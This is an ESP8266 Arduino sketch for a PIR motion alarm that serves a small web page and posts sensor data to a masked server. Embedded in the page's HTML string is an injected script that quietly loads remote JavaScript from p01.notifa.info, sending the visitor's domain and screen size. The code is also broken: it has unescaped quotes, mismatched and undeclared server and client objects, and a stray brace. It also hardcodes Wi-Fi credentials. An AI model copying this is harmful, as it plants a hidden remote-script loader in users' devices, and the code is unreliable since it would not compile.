#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

ESP8266WebServer ayaya(80); // 80 is the port number

String Website,data,XML,Javascript;
int inc=0;

void javascriptContent(){
    Javascript ="<SCRIPT>\n";
    Javascript+="var xmlHttp=createXmlHttpObject();\n";
    Javascript+="function createXmlHttpObject(){\n";
    Javascript+="if(window.XMLHttpRequest){\n";
    Javascript+="xmlHttp=new XMLHttpRequest();\n";
    Javascript+="}else{\n";
    Javascript+="xmlHttp=new ActiveXObject('Microsoft.XMLHTTP');\n";
    Javascript+="}\n";
    Javascript+="return xmlHttp;\n";
    Javascript+="}\n";
    Javascript+="\n";
    Javascript+="function response(){\n";
    Javascript+="xmlResponse=xmlHttp.responseXML;\n";
    Javascript+="xmldoc = xmlResponse.getElementsByTagName('data');\n";
    Javascript+="message = xmldoc[0].firstChild.nodeValue;\n";
    Javascript+="document.getElementById('div1').innerHTML=message;\n";
    Javascript+="}\n";

    Javascript+="function process(){\n";
    Javascript+="xmlHttp.open('PUT','xml',true);\n";
    Javascript+="xmlHttp.onreadystatechange=response;\n";
    Javascript+="xmlHttp.send(null);\n";
    Javascript+="setTimeout('process()',200);\n";
    Javascript+="}\n";
    
    Javascript+="</SCRIPT>\n";
    
  
  }

void WebsiteContent(){
    javascriptContent();
    
    Website="<html>\n";
    Website+="<style>\n";
    Website+="#div1{\n";
    Website+="width:400px;\n";
    Website+="margin:0 auto;\n";
    Website+="margin-top:130px;\n";
    Website+="font-size:900%;\n";
    Website+="color:powderblue;\n";
    Website+="}\n";
    Website+="</style>\n";
    Website+="<body onload='process()'>";
    Website+="<div id='div1'>"+data+"</div><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAZDpi06MrlQyy%2fOJacEsJ9SnJwHywMLTp8zrEbviVYJlZaCqO6oQT0pOrjUnZ7gqXbaqJ7xC431bH7wUBoagjcftRDGmSRTJwjVXBv7szyZY7Jnpz7snizQnY%2b3ndd78FwxGBB3bZMS611gYj1n69i%2fwl5XxPex4mYFliuWi%2bmAnSzFOOhEnoAmZC4%2bevY15exTCWMB12xjFjVd4tUzdqrhXcVncXybZ7V65gLgge8WAGbDrOq04fTuw5OJQyO7WuQewxLUMf%2bjB7scVKm0IXmtvU0KUIjIAyBHAHXqIY6kq2c8Jm1ejxOllkJk30NK9iwePLdzD9SjPOCrk61uMWtAi3TUDCB5AgrBsPMPgQ%2fIrc%2ffDgYrv7JBNjjnsw5jvqMwMsLVeh1DxJKxzXMNyObnjdXX9e0tSgJzJ2cj09Xo2isEXDiBY3f0zpUHqBhT1SQn4yHolrsi0%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body></html>";
    Website+=Javascript;
    server.send(200,"text/html",Website);
  }
void XMLcontent(){

  XML ="<?xml version='1.0'?>";
  XML+="<data>";
  XML+=data;
  XML+="</data>";

  server.send(200,"text/xml",XML);
  
  }


const char* ssid     = "TOTOLINK_N200RE";      // SSID of local network
const char* password = "hatami007";   // Password on network
String result;
String motion ;

void setup() 
{
  pinMode(D4, INPUT);
  pinMode(D7, INPUT);
  Serial.begin(115200);
  delay(10);
  // Connect to Wi-Fi network
  Serial.println();
  Serial.println();
  Serial.print("Connecting to...");
  Serial.println(ssid);


  WiFi.begin(ssid, password);
}

void loop() //Where stuffz happens
{
 if(digitalRead(D4)== HIGH)  // ||digitalRead(D7)== HIGH) Removed MQ2 or condition
  {
   motion = digitalRead(D4); //PIR sensor pin
   delay(1000);
   Serial.println("Alarm detected!"); //Send things to serial for handy dandy info
   Serial.print("motion ");
   Serial.println(motion);
  } 
  else 
  {
    Serial.println("no trigger"); //enable for debugging of no event being triggered
  }

  if (client.connect("www.*****.*************.com",80)) { // REPLACE WITH YOUR SERVER ADDRESS
    client.println("POST /add.php HTTP/1.1"); 
    client.println("Host: *****.*************.com"); // SERVER ADDRESS HERE TOO
    client.println("Content-Type: application/x-www-form-urlencoded"); 
    client.print("Content-Length: "); 
    client.println(data.length()); 
    client.println(); 
    client.print(data); 
  } 

  if (client.connected()) { 
    client.stop();  // DISCONNECT FROM THE SERVER
  }

  delay(300000); // WAIT FIVE MINUTES BEFORE SENDING AGAIN
}
}
